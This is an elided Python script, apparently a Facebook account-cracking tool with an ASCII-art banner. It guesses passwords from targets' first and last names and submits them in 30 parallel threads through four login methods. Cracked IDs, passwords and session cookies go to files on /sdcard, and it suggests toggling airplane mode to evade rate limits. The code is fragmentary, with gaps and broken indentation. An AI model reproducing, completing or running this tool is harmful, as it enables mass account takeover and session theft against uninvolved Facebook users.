#!/usr/bin/python
#Original written By Dragon Heroo<3

import os,zlib
from os import system as osRUB
from os import system as cmd
os.system('clear')
print('Dragon Enter Haii ta ...\n')
...
from concurrent.futures import ThreadPoolExecutor as sarfrazDragon
from string import * 
...
8888888P"  888    "Y888888  "Y88888  "Y88P"  888  888 
                                888                   
                           Y8b d88P                   
                            "Y88P" \x1b[38;5;46mBAAP BAAP HOTA HE                   
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[LONELY] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Dragonb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Dragonb};{ckkk}"
                    print(f"\r{R} [LONELY-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/LONELY_OK_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/LONELY-COOKIE-ID-M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Dragon-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/LONELY_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Dragon] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/Dragon_OK_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Dragon_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Dragon-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/Dragon_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Dragon] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Dragon] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Dragon-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Dragon_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            pw = []
            clear()
            print('\nMaximum Pass List> 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example: First123,Last123,First@last,Lastfirst,Etc]')
            print('')
            if sl =='':
                print('\nPut limit Under 1 - 30')
            elif sl > 20:
                print('\nPassword List Should Not Be More Then> 30')
            else:
                for sr in range(sl):
            ...
            print(f"\r{Z}Use Flight ✈️ Mode (aeroplane-Mode) before use {S}")
            ...
            print(47*"-")
            with sarfrazDragon(max_workers=30) as Dragonworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                Dragonworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Dragonworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Dragonworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Dragonworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
